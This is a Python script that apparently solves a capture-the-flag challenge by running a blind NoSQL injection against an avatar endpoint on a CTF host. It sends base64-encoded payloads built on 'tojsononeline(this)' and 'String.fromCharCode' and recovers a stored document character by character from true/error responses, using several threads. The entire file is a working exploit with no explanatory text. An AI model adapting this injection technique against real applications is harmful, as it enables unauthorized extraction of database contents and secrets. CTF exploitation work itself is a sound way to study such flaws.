#!/usr/bin/python
# -*- coding: utf-8 -*-

import sys
import urllib
import requests
from time import sleep
import base64

import threading

maxthreads = 5

user_agent = 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.6) Gecko/20071008 Ubuntu/7.10 (gutsy) Firefox/2.0.0.6'
headers = {'User-Agent' : user_agent, 'Connection': 'keep-alive'}

maxlength = 200

string_true = 'petalo'
string_error = 'Error with SQL query'

dic = ' \"etaoinsrhldcumfpgwybvkxjqz0123456789{}.:,_ETAOINSRHLDCUMFPGWYBVKXJQZ[]()/\\~-?'

def cleanList(items):
	a = [x if x!=None else '_' for x in items]
	b = ''.join(a)
	return b.rstrip('_')

def worker(i):
	ct = threading.currentThread()
	threadLimiter.acquire()

	global finished

	if finished!=False and i>finished:
		threadLimiter.release()
		return

	kount = 0
	for letter in dic:
		if finished!=False and i>finished:
			threadLimiter.release()
			return

		kount += 1

		n = ord(letter)
		url2 = 'http://challenges.ka0labs.org:31337/avatar/'+ base64.b64encode(urllib.unquote('Petalo%22%26%26tojsononeline(this)['+str(i)+']==String.fromCharCode('+str(n)+');%00'))
		while True:
			try:
				r = requests.get(url2, headers=headers, allow_redirects=False)
				data = r.text
			except:
				print("\n[+] Request Error! ")
				sleep(1)
				continue
			break

		if string_error in data:
			print(data)
			print("\nERROR")
			sys.exit()
			continue

		elif string_true in data:
			result[i] = letter

			string = cleanList(result)
			sys.stdout.write('\r'+string)
			sys.stdout.flush()

			threadLimiter.release()
			break

		else:

			if kount == len(dic):
				sys.stdout.write(' \n')
				sys.stdout.flush()
				threadLimiter.release()
				finished = i if finished==False or i<finished else finished
				return result
				break
			continue


def execute():
	threads = []

	for i in range(maxlength):
		tr = threading.Thread(target=worker, args=(i,))
		threads.append(tr)
		tr.start()

	for x in threads:
		x.join()

	return result

threadLimiter = threading.BoundedSemaphore(maxthreads)

global finished
finished = False
result = [None] * maxlength
result = execute()
print('\n'+ ''.join(result[:finished])+'\n')
